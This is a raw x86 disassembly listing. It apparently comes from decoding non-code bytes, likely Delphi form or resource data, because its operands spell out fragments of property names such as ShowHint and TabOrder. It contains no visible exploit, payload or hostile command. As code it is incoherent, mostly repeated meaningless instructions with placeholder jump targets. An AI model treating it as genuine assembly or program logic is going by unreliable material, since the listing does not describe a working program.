rol [ eax + eax + 0x1 ] 0x1
insb
jae r-xdata
rol [ eax ] 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ esi ] al
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ esi + 0x75 ] al
insb
insb
inc esp
jb r-xdata
jpo r-xdata
jb r-xdata
adc [ eax ] al
push eax
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
str [ edx ]
inc esp
jb r-xdata
add [ eax + 0x14 ] bl
inc esp
add [ ebx ] bl
add bh bh
js r-xdata
add [ eax ] cl
add al [ eax ]
dec [ eax + 0x7b ]
inc ebx
sbb al 0x44
add [ eax + eax ] dh
[ esp + ecx * 4 ]
outsd
outsb
jae r-xdata
add [ bx + si ] dl
inc eax
add [ ecx ] ah
add al [ eax ]
dec [ ebx + edi * 2 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ eax + 0x6f ] cl
je r-xdata
and [ ebx + 0x43 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
add eax 0x6c797453
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080019 ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
sbb [ eax ] eax
or [ ebx + 0x65 ] dl
arpl [ ecx + ebp * 2 + 0x6f ] si
insd
popad
jae r-xdata
arpl [ ebx + 0x70 ] bp
aaa
inc ebp
add [ eax ] ch
add al [ eax ]
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060017 ] al
add [ eax ] al
adc al [ eax ]
or eax [ edx + esi * 2 + 0x61 ]
push edx
outsd
jb r-xdata
add [ eax ] al
inc ebx
jne r-xdata
sub [ eax + eax + 0x6c ] eax
add [ eax ] eax
push [ ecx + edx * 8 + 0x44 ]
add [ ecx ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
sbb [ ebx ] 0x44
add [ ecx ] ah
add bh bh
adc [ eax ] al
cdq
add [ eax ] al
push [ eax + ebp * 2 + 0x687c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080022 ] al
push 0x6948776f
outsb
je r-xdata
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090026 ] al
outsd
outsb
je r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
xor eax 0x22c0043
add [ gs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
add [ edx ] bl
add [ 0x6c797453 ] al
imul ebp [ esi + 0x74 ] 0x4332ec73
arpl [ ecx + ebp * 2 + 0x6f ] si
jo r-xdata
add [ eax ] al
and eax 0x61500e00
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ecx
add [ eax ] al
call [ eax + 0x1004468 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc eax
jb r-xdata
and al 0x0
or dl [ eax + 0x61 ]
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ ecx ] bl
add bh bh
nop
push 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
sub al 0x2
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002c ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
rcr [ esi ] 0x1
inc esp
add al ch
add [ eax ] al
jo r-xdata
outsb
jne r-xdata
add [ eax ] al
sub [ eax ] 0x0
outsb
je r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
inc esp
add [ edx ] bh
sbb al [ eax + eax - 0x65 ]
add [ eax ] al
add [ eax + 0x4f09002f ] al
outsb
dec ebp
outsd
jne r-xdata
in al 0x1c
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
xor eax 0x2700043
add bh bh
jo r-xdata
daa
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xc656c62
and al 0x44
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
adc [ eax ] al
push edi
add [ eax ] al
inc [ esi - 0x782bffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or cl [ edi + 0x6e ]
js r-xdata
push cs
dec edi
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
push 0x6948776f
outsb
je r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ebx + eax * 2 + 0x43ac9000 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0020 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push ebp
jo r-xdata
cmp eax [ ebx ]
or [ ebx + eax * 2 + 0x43ac5800 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001c ] al
outsb
inc esp
inc esp
outsd
ja r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
adc al 0x4f
outsb
inc ebx
jb r-xdata
add bh bh
add [ eax + 0x4f0b002d ] al
add [ eax ] al
dec edi
jbe r-xdata
inc esp
jb r-xdata
dec edi
outsb
push eax
outsd
jo r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0028 ] al
pop ecx
inc ebp
add [ eax + eax ] bh
[ edi ]
inc esp
add [ ecx ] al
adc [ eax ] al
0xd8ff0000 0x4468
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax + 0x4f10001f ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
jb r-xdata
jpe r-xdata
inc ebx
pop eax
inc ecx
add al bh
add [ eax ] al
inc ebx
ja r-xdata
pop esp
sbb eax 0xd80044
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ebx ] cl
dec edi
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or [ edi + 0x6e ] ecx
popad
je r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
outsb
je r-xdata
cmp [ bx + di ] ah
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
add [ eax ] al
add [ esp + ebp * 4 + 0x10043 ] ch
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
push cs
dec edi
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
adc [ ebx + eax * 2 ] bh
add [ esp + ebp * 4 + 0x43 ] al
push ebx
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
arpl [ ebx - 0x8 ] bp
xor al 0x43
add [ eax + 0x2 ] ah
add bh bh
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001e ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
jb r-xdata
push edx
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001d ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
mov ah 0x3b
inc ebx
add [ esp + ebp * 4 ] bl
inc ebx
add [ esp + ebp * 4 + 0x43 ] dh
dec ebp
outsd
jbe r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x78 ] bp
pop ds
inc esp
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
outsb
inc ebx
insb
popad
jae r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
outsd
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002e ] al
pop ds
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
jo r-xdata
je r-xdata
insb
or dh [ edx + esi * 2 + 0x56 ]
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0032 ] al
outsb
push ebx
je r-xdata
push esp
pop eax
inc ecx
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
in al 0x1c
inc esp
add al ah
add [ eax ] al
jmp eax
je r-xdata
je r-xdata
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
inc ebx
inc ebx
add [ esp + esi * 2 ] cl
jb r-xdata
push es
je r-xdata
imul esp [ ebx + 0x61 ] 0x6f43086c
insd
inc ebx
je r-xdata
adc [ ebx + eax * 2 ] al
add ecx [ ecx ]
push esp
push esp
imul esp [ ebx + 0x6b ] 0x6b72614d
inc esp
outsd
arpl [ ebx + 0x30 ] bp
pop ds
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
jb r-xdata
or al 0x42
insb
jae r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
je r-xdata
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
add [ edi - 0x297fffbd ] al
inc esp
add [ ebx + ebx * 8 - 0x2517ffbc ] bl
inc esp
add [ eax - 0x3ffbba6 ] ch
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
add ah al
inc ebp
je r-xdata
outsd
jb r-xdata
inc esp
add [ esp + ebx * 2 ] dh
inc ecx
jne r-xdata
je r-xdata
insb
jae r-xdata
inc ebx
add [ eax ] al
outsd
insd
push edx
imul esp [ edi + 0x68 ] 0x6d740974
inc esp
jb r-xdata
add [ eax ] eax
inc eax
add ah bl
inc esp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
inc ebp
inc ebx
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
insb
jae r-xdata
add [ eax + 0x2 ] al
add [ eax ] al
dec esp
sub eax [ eax + eax - 0x24 ]
cmovb eax [ eax ]
les eax [ ebp + 0x43 ]
inc edx
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
inc ebp
inc ebx
push esp
outsd
push ebx
jpe r-xdata
inc esp
add [ eax - 0x70 ] cl
outsd
or [ ebx + esi * 2 + 0x4d ] dh
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
nop
popad
outsb
jne r-xdata
dec ebp
inc esp
inc ebx
add [ ebx ] al
or [ esp + edx * 2 + 0x69 ] edx
arpl [ ebx + 0x4d ] bp
popad
jb r-xdata
inc ebx
add [ 0x6f426d74 ] cl
je r-xdata
add [ eax ] al
or al 0x44
mov eax eax
enter 0x4343 0x0
add edx [ esp + edx * 2 ]
push esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax * 2 + 0x45c40043 ] ah
je r-xdata
inc esp
inc ebx
add [ ebx ] al
or dl [ esp + edx * 2 + 0x69 ]
arpl [ ebx + 0x53 ] bp
add [ esi + ecx * 4 - 0x2493ffbc ] ah
inc esp
add [ ebx - 0x74b3ffbc ] dl
inc ecx
insb
inc ebx
add [ esi ] al
je r-xdata
add [ eax ] al
add al [ eax ]
add [ eax ] al
push eax
inc esp
outsb
je r-xdata
dec esp
mov eax [ ecx ]
adc al 0x88
insb
or [ ebx + 0x6f ] al
insd
inc ebx
outsd
arpl [ ebx + 0x42 ] bp
popad
jb r-xdata
add [ eax + ecx * 4 ] dl
add [ ebx + ecx * 4 + 0x41 ] cl
dec esi
outsd
outsb
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x44 ] dl
imul esp [ ebx + 0x6b ] 0x6c797453
add [ esp + eax * 2 ] cl
jb r-xdata
je r-xdata
sub_434566
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add al bl
xchg [ ebx ] eax
fsub [ ecx - 0x7773ffbc ]
inc ebx
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add [ ecx + ecx * 4 + 0x43 ] ch
add [ eax - 0x30 ] ch
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_4346f5
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
sub [ esp + eax * 2 ] bl
add [ eax + eax ] dh
[ esp + ecx * 4 ]
sub_434713
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0013 ] al
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
dec edi
jb r-xdata
jb r-xdata
add [ eax + 0x2 ] al
outsb
je r-xdata
imul ebp [ esi - 0x3c ] 0x8004343
add al [ eax ]
jmp [ edx + ecx * 4 ]
imul ebp [ esi + 0x74 ] 0x40105473
add [ edx + eax ] cl
add bh bh
lodsb [ esi ]
mov [ ebx ] es
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc al 0x0
or [ ecx + ebp * 2 + 0x6e ] cl
push ebx
imul edi [ edx + 0x65 ] r-xdata
and [ edx ] al
add bh bh
xor [ ebx + eax * 2 + 0x100 ] cl
add [ eax ] al
add [ eax ] al
or [ edx ] 0x0
add [ eax ] al
adc eax 0x614d0300
js r-xdata
add bh bh
sbb al 0x67
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001b ] al
outsd
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
or edx [ eax + 0x61 ]
jb r-xdata
adc [ eax ] al
sbb al 0x2
add bh bh
adc al 0x8c
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ ebx ] al
dec ebp
adc [ eax ] al
xor [ edx ] al
add bh bh
call 0x1438c53
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ esi ] al
push ebx
insb
inc ebp
outsb
push esp
adc [ eax ] al
sub al 0x2
add bh bh
aam 0x8d
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jo r-xdata
sbb al [ eax ]
or [ eax + 0x61 ] dl
push ebx
imul edi [ edx + 0x65 ] r-xdata
jl r-xdata
outsd
outsb
add [ eax ] dl
inc eax
add [ ecx - 0x3b00ffff ] ch
rol [ eax + eax + 0x1 ] 0x1
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or [ eax + 0x6f ] edx
outsb
je r-xdata
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jb r-xdata
add [ eax ] bl
add al [ eax ]
[ ebp + ecx * 4 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
hlt
add [ eax ] eax
add [ eax ] dl
inc eax
add [ ecx - 0x4b010000 ] bl
push 0x687c0044
jl r-xdata
imul esi [ ebx + 0x69 ] 0x54656c62
push ds
add [ 0x64696c53 ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] al
and al 0x2
add bh bh
dec eax
mov [ ebx ] es
add [ eax ] eax
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ edx - 0x27010000 ] bl
push 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb [ eax ] eax
push cs
push eax
popad
jb r-xdata
add [ eax + 0x4f0a002b ] al
outsb
inc esp
jb r-xdata
js r-xdata
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
insb
or al 0x24
inc esp
or al 0x44
inc ebx
add [ ecx ] cl
add al [ eax ]
[ eax + 0x100438c ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x69540900
arpl [ ebx + 0x4d ] bp
popad
jb r-xdata
add [ eax ] al
cmp bh 0xff
sbb eax [ eax + eax - 0x10 ]
rol [ eax + eax + 0x70 ] 0x1
rol [ eax + eax + 0x1 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x14 ] al
and al 0x0
or edx [ eax + ebp * 2 + 0x75 ]
insd
bound ecx [ ebp + 0x6e ]
je r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080021 ] al
push 0x6948776f
outsb
je r-xdata
and [ eax ] al
or [ ebx + 0x65 ] dl
insb
add al [ eax ]
call esp
lea eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
arpl [ ecx + 0x54 ] di
adc [ eax ] al
sub [ edx ] al
add bh bh
add [ ebx + eax * 2 + 0x100 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x6f500800
jae r-xdata
bound ebp [ ebp + 0x54 ]
dec ebp
sbb al 0x0
or [ esi + 0x72 ] eax
jno r-xdata
add [ eax ] eax
outsb
je r-xdata
add [ eax ] al
dec edi
jbe r-xdata
inc esp
add [ eax ] cl
add [ eax ] eax
push eax
outsd
jo r-xdata
jae r-xdata
push ebx
je r-xdata
insb
je r-xdata
add [ eax ] al
add al [ eax ]
dec [ eax - 0x74 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
push 0x6948776f
outsb
je r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
add [ eax + 0x4f07002e ] al
push esp
pop eax
inc ecx
add al al
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002c ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x78 ] bp
pop ds
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002d ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
jo r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0028 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
add [ es : ecx ] cl
push esp
imul esp [ ebx + 0x6b ] 0x6c797453
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
test [ esi + 0x44 ] ah
add ah dl
xchg [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xc656c62
and al 0x44
inc esp
inc ebx
add [ edx ] cl
add al [ eax ]
inc [ esp + ecx * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
outsd
outsb
add [ eax ] dl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] al
adc [ edx ] al
add bh bh
call 0x1438b9c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or cl [ edi + 0x6e ]
dec ebx
jns r-xdata
pop eax
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002f ] al
outsb
inc ebp
js r-xdata
pop ds
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop eax
inc ecx
add [ eax ] bh
add al [ eax ]
outsb
jbe r-xdata
jb r-xdata
push ebx
je r-xdata
dec edi
jae r-xdata
jns r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 ] ah
inc ebx
add [ eax + eax ] al
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
jo r-xdata
outsb
pop ds
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x1e
inc esp
add al ah
add [ eax ] eax
jmp eax
jae r-xdata
jb r-xdata
jae r-xdata
inc esp
jb r-xdata
inc ebx
add [ eax ] al
rcr [ 0x1e80044 ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
rol [ ecx ] 0x0
sbb eax 0x1d80044
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or [ edi + 0x6e ] ecx
add [ eax ] 0x0
add [ eax + 0x4f0b0034 ] al
and [ eax + eax ] eax
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
outsb
push ebx
je r-xdata
add [ eax + 0xb004390 ] dl
push esp
inc ebx
outsd
inc eax
add [ eax + 0x300434c ] bl
push cs
push esp
push ebp
inc esp
dec edi
jb r-xdata
outsb
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esp + ecx * 2 + 0x750c0043 ] dl
dec eax
outsd
jb r-xdata
outsd
outsb
inc esi
outsd
jb r-xdata
lea eax [ bx + si ]
sbb al 0x4c
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
inc eax
jb r-xdata
jb r-xdata
outsd
insd
inc ebx
je r-xdata
je r-xdata
je r-xdata
outsb
jb r-xdata
add [ eax ] al
add al [ eax ]
add [ eax ] al
or al 0x4d
jpe r-xdata
dec esp
inc ebx
add [ esi * 2 + 0x726f4864 ] cl
imul edi [ edx + 0x6f ] 0x6c61746e
popad
je r-xdata
add [ eax + 0x32 ] ah
inc eax
add [ eax + edx * 4 + 0x43 ] bh
inc esp
outsd
arpl [ ebx + 0x30 ] bp
inc edx
jne r-xdata
jae r-xdata
outsb
or dl [ ebp + edx * 2 + 0x44 ]
inc edx
je r-xdata
insb
add [ ebx ] al
adc [ ebp + edx * 2 + 0x70 ] dl
inc esp
outsd
ja r-xdata
outsd
outsb
xchg esp eax
imul ebp [ edi + 0x6e ] 0x6d726f46
imul ebp [ esi + 0x67 ] 0x6e657645
dec esi
inc ebx
add [ edi ] al
jne r-xdata
outsb
je r-xdata
pop es
imul esp [ ebx + 0x61 ] 0x6f43086c
insd
inc ebx
je r-xdata
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ esi ]
push esp
push ebp
inc esp
inc ecx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
nop
pop esp
dec esp
inc ebx
add [ ebx ] al
push cs
jbe r-xdata
je r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
dec ebp
inc ebx
inc ebp
push esp
jns r-xdata
add [ gs : ecx + edx ] ch
inc eax
add al bl
dec esp
inc ebx
add [ ebp + 0x4d980040 ] cl
inc ebx
outsb
inc esp
imul esi [ edx + 0x65 ] 0x6f697463
add cl [ eax ]
push es
push ebx
outsb
or [ ebx + 0x6f ] al
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx * 2 + 0x75070043 ] cl
jo r-xdata
or dh [ ebp + 0x64 ]
push esi
jb r-xdata
insb
jb r-xdata
outsb
inc esp
outsd
ja r-xdata
insd
inc ebx
je r-xdata
inc ebx
outsd
insb
jae r-xdata
inc esp
dec esp
je r-xdata
inc eax
add [ ecx * 2 - 0x576fffbd ] cl
dec esi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x434f ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
outsb
inc ebp
add [ eax ] cl
adc [ ebp + edx * 2 + 0x44 ] dl
inc ebx
push 0x69676e61
outsb
inc ebp
jbe r-xdata
outsd
outsb
add eax 0x55647075
jo r-xdata
dec esi
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc ebx
je r-xdata
outsb
add [ ebx ] ecx
inc ecx
insb
insb
outsd
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0xb ] si
insb
jae r-xdata
jb r-xdata
insb
imul esp [ edi + 0x6e ] 0x74747542
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x4c ] bl
inc ebx
add [ esi ] al
jne r-xdata
inc edx
je r-xdata
rcr ah 0x4c
inc ebx
add [ eax ] cl
or eax 0x43445554
push esp
jns r-xdata
